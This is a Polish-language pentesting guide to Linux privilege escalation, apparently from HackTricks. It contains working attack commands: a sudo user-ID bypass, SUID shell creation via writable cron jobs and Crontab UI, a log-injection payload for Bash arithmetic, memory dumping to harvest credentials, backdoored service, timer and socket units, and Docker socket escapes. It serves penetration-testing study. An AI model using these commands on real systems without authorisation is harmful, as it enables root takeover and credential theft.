# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o OS

Zacznijmy zdobywać informacje o działającym systemie operacyjnym.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Jeśli **masz uprawnienia do zapisu w którymkolwiek katalogu zawartym w zmiennej `PATH`**, możesz być w stanie hijackować niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Env info

Ciekawe informacje, passwords lub API keys w zmiennych środowiskowych?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję jądra i czy istnieje jakiś exploit, który można wykorzystać do eskalacji uprawnień.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych wersji jądra i kilka już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć niektóre **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej witryny możesz wykonać:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchomić na ofierze, sprawdza tylko exploits dla kernel 2.x)

Zawsze **wyszukaj wersję kernela w Google** — być może Twoja wersja kernela jest wymieniona w jakimś kernel exploit i wtedy będziesz mieć pewność, że exploit jest ważny.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja sudo

Na podstawie podatnych wersji sudo, które występują w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje sudo sprzed 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) umożliwiają nieuprzywilejowanym użytkownikom lokalnym eskalację uprawnień do root za pomocą opcji `--chroot` w sudo, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.

Oto [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) do wykorzystania tej [luki](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploitu upewnij się, że twoja wersja `sudo` jest podatna i że obsługuje funkcję `chroot`.

Po więcej informacji odnieś się do oryginalnego [komunikatu o podatności](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja podpisu nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład**, jak ten vuln mógł zostać wykorzystany
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dalsza enumeration systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wykaz możliwych środków obrony

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli znajdujesz się wewnątrz docker container możesz spróbować się z niego wydostać:


{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy znajdują się tam prywatne informacje.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaria
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź także, czy **any compiler is installed**. Jest to przydatne, jeśli musisz użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może jest jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do escalating privileges…\
Zaleca się ręczne sprawdzenie wersji najbardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz także użyć **openVAS**, aby sprawdzić, czy na maszynie zainstalowane jest przestarzałe lub podatne oprogramowanie.

> [!NOTE] > _Uwaga: te polecenia wyświetlą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy któraś z zainstalowanych wersji oprogramowania jest podatna na znane exploits_

## Procesy

Sprawdź, jakie **procesy** są uruchomione i zweryfikuj, czy któryś z procesów nie ma **więcej uprawnień niż powinien** (może tomcat uruchomiony przez root?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** — możesz je wykorzystać do eskalacji uprawnień](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je sprawdzając parametr `--inspect` w linii poleceń procesu.\
Sprawdź też **swoje uprawnienia do binarek procesów** — być może możesz nadpisać którąś.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do zidentyfikowania podatnych procesów uruchamianych często lub gdy spełniony jest zbiór wymagań.

### Pamięć procesu

Niektóre usługi serwera zapisują **credentials w postaci czystego tekstu w pamięci**.\
Zwykle będziesz potrzebować **uprawnień root**, aby czytać pamięć procesów należących do innych użytkowników, dlatego zwykle jest to bardziej użyteczne, gdy już jesteś root i chcesz odnaleźć więcej credentials.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz czytać pamięć procesów, które są twoje**.

> [!WARNING]
> Zauważ, że obecnie większość maszyn **domyślnie nie pozwala na ptrace**, co oznacza, że nie możesz zrzucać innych procesów należących do nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: tylko proces rodzic może być debugowany.
> - **kernel.yama.ptrace_scope = 2**: tylko administrator może użyć ptrace, ponieważ wymagana jest capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żadne procesy nie mogą być śledzone przy pomocy ptrace. Po ustawieniu wymagany jest ponowny rozruch, by ponownie włączyć ptracing.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać Heap i wyszukać w nim credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu (PID) **maps pokazuje, jak pamięć jest zmapowana w przestrzeni adresowej tego procesu**; pokazuje też **uprawnienia każdego zmapowanego obszaru**. Pseudoplik **mem** **udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **obszary pamięci są odczytywalne** oraz ich offsety. Wykorzystujemy te informacje, aby **seek into the mem file and dump all readable regions** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do systemowej **pamięci fizycznej**, a nie pamięci wirtualnej. Do wirtualnej przestrzeni adresowej jądra można uzyskać dostęp za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla Linux

ProcDump to wersja na Linux klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące root i zrzucić proces należący do ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagane jest root)

### Poświadczenia z pamięci procesu

#### Przykład ręczny

Jeśli stwierdzisz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump the process (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby na dump the memory of a process) i wyszukać credentials w memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie wykradać dane uwierzytelniające w postaci czystego tekstu z pamięci oraz z niektórych dobrze znanych plików. Wymaga uprawnień root, aby działać poprawnie.

| Funkcja                                           | Nazwa procesu         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH - użycie sudo)         | sshd:                |

#### Wzorce wyszukiwania/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane zadania/Cron

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Jeśli panel webowy “Crontab UI” (alseambusher/crontab-ui) działa jako root i jest powiązany tylko z loopback, nadal możesz uzyskać do niego dostęp przez SSH local port-forwarding i utworzyć uprzywilejowane zadanie, aby wykonać privesc.

Typowy łańcuch
- Odkryj port dostępny tylko z loopback (np. 127.0.0.1:8000) oraz realm Basic-Auth za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź poświadczenia w artefaktach operacyjnych:
- Kopie zapasowe/skrypty z `zip -P <password>`
- jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tuneluj i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie o wysokich uprawnieniach i uruchom natychmiast (tworzy powłokę SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Wzmacnianie bezpieczeństwa
- Nie uruchamiaj Crontab UI jako root; ogranicz jego uprawnienia do dedykowanego użytkownika z minimalnymi przywilejami
- Ogranicz nasłuch do localhost i dodatkowo ogranicz dostęp przez firewall/VPN; nie używaj tych samych haseł
- Unikaj umieszczania sekretów w unit files; użyj secret stores lub EnvironmentFile dostępnego tylko dla root
- Włącz audyt/logowanie dla wykonywania zadań na żądanie



Sprawdź, czy jakieś zaplanowane zadanie jest podatne. Być może możesz wykorzystać skrypt uruchamiany przez root (wildcard vuln? czy możesz modyfikować pliki używane przez root? użyć symlinks? stworzyć specyficzne pliki w katalogu, którego używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka Crona

Na przykład, wewnątrz _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, że użytkownik "user" ma prawa zapisu do /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root zawiera “**\***” w komendzie, możesz to wykorzystać, aby wywołać nieoczekiwane skutki (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby poznać więcej trików związanych z wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. Jeśli root cron/parser odczytuje nieufne pola loga i przekazuje je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...), które wykona się jako root, gdy cron zostanie uruchomiony.

- Why it works: W Bash rozszerzenia zachodzą w tej kolejności: parameter/variable expansion, command substitution, arithmetic expansion, następnie word splitting i pathname expansion. Zatem wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` jest najpierw podstawiana (uruchamiając polecenie), a pozostała wartość numeryczna `0` jest używana w obliczeniu, dzięki czemu skrypt kontynuuje bez błędów.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Spraw, aby tekst kontrolowany przez atakującego został zapisany w parsowanym logu, tak aby pole wyglądające na liczbę zawierało command substitution i kończyło się cyfrą. Upewnij się, że Twoje polecenie nie wypisuje nic na stdout (lub przekieruj je), aby działanie arytmetyczne pozostało prawidłowe.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Jeśli możesz **zmodyfikować skrypt cron** uruchamiany jako root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt uruchamiany przez roota korzysta z **katalogu, do którego masz pełny dostęp**, może być przydatne usunięcie tego katalogu i **utworzenie katalogu symlink wskazującego na inny**, który zawiera skrypt kontrolowany przez Ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Niestandardowo podpisane binaria cron z zapisywalnymi payloadami
Blue teams czasami "podpisują" binaria uruchamiane przez cron, dumpując niestandardową sekcję ELF i używając `grep` do znalezienia ciągu producenta przed uruchomieniem ich jako root. Jeśli to binarium jest zapisywalne przez grupę (np. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i możesz leak the signing material, możesz sfabrykować sekcję i przejąć zadanie cron:

1. Użyj `pspy`, aby przechwycić proces weryfikacji. W Era root wykonał `objcopy --dump-section .text_sig=text_sig_section.bin monitor` a następnie `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` i potem uruchomił plik.
2. Odtwórz oczekiwany certyfikat używając the leaked key/config (z `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Zbuduj złośliwą zamiennik (np. dodaj SUID bash, dodaj swój SSH key) i osadź certyfikat w `.text_sig`, tak aby grep przeszedł:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Nadpisz zaplanowane binarium, zachowując bity wykonywalności:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Poczekaj na następne uruchomienie cron; gdy naiwna weryfikacja podpisu przejdzie, twój payload zostanie uruchomiony jako root.

### Częste zadania cron

Możesz monitorować procesy, aby wyszukać te, które są uruchamiane co 1, 2 lub 5 minut. Możesz to wykorzystać, aby eskalować uprawnienia.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **posortować według rzadziej wykonywanych poleceń** i usunąć polecenia, które były wykonywane najczęściej, możesz użyć:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz także użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wypisywać każdy uruchamiany proces).

### Niewidoczne cron jobs

Możliwe jest utworzenie cronjob **przez umieszczenie znaku powrotu karetki po komentarzu** (bez znaku nowej linii), i cronjob będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Pliki _.service_ z prawem zapisu

Sprawdź, czy możesz zapisać jakikolwiek plik `.service`; jeśli tak, możesz go **zmodyfikować** tak, aby **uruchamiał** twój **backdoor**, gdy usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (może być konieczne poczekanie na reboot maszyny).\
Na przykład umieść swój backdoor w pliku `.service` używając **`ExecStart=/tmp/script.sh`**

### Zapisowalne pliki binarne usług

Pamiętaj, że jeśli masz **uprawnienia zapisu do binariów uruchamianych przez usługi**, możesz je podmienić na backdoors, dzięki czemu po ponownym uruchomieniu usług backdoors zostaną wykonane.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli odkryjesz, że możesz **zapisywać** w dowolnym z folderów na tej ścieżce, możesz być w stanie **escalate privileges**. Musisz szukać **użycia ścieżek względnych w plikach konfiguracji usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **executable** o **same name as the relative path binary** wewnątrz folderu PATH systemd, do którego masz prawa zapisu; gdy serwis zostanie poproszony o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor will be executed** (użytkownicy bez uprawnień zwykle nie mogą uruchamiać ani zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Learn more about services with `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, i które kontrolują pliki `**.service**` lub zdarzenia. Timery mogą być używane jako alternatywa dla cron, ponieważ mają wbudowaną obsługę zdarzeń opartych na czasie kalendarzowym i zdarzeń monotonicznych oraz mogą być uruchamiane asynchronicznie.

Możesz wylistować wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi on niektóre istniejące jednostki systemd.unit (np. `.service` lub `.target`)
```bash
Unit=backdoor.service
```
W dokumentacji można przeczytać, czym jest Unit:

> Jednostka, którą należy aktywować, gdy ten timer wygaśnie. Argument to nazwa unitu, której sufiks nie jest ".timer". Jeśli nie jest określony, ta wartość domyślnie wskazuje na service o tej samej nazwie co unit timera, z wyjątkiem sufiksu. (Patrz wyżej.) Zaleca się, aby nazwa unitu, która jest aktywowana, i nazwa unitu timera były identyczne, z wyjątkiem sufiksu.

Dlatego, aby nadużyć tego uprawnienia, musiałbyś:

- Znaleźć jakiś systemd unit (np. `.service`), który **uruchamia zapisywalny plik binarny**
- Znaleźć jakiś systemd unit, który **uruchamia względną ścieżkę** i masz **prawa zapisu** nad **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i musisz wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zauważ, że może istnieć kilka **sockets listening for HTTP** requests (_Nie mówię o plikach .socket, lecz o plikach działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na żądanie HTTP**, możesz **komunikować się** z nim i być może **exploit some vulnerability**.

### Zapisowalny Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

Jeśli masz write access do Docker socket, możesz przeprowadzić privilege escalation używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z dostępem do systemu plików hosta na poziomie root.

#### **Używanie Docker API bezpośrednio**

W sytuacjach, gdy Docker CLI nie jest dostępny, gniazdo Dockera można nadal obsługiwać za pomocą Docker API i poleceń `curl`.

1.  **Wypisz obrazy Docker:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Utwórz kontener:** Wyślij żądanie utworzenia kontenera, który montuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony kontener:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Dołącz do kontenera:** Użyj `socat`, aby nawiązać połączenie z kontenerem i umożliwić wykonywanie poleceń w jego wnętrzu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po nawiązaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z dostępem do systemu plików hosta na poziomie root.

### Inne

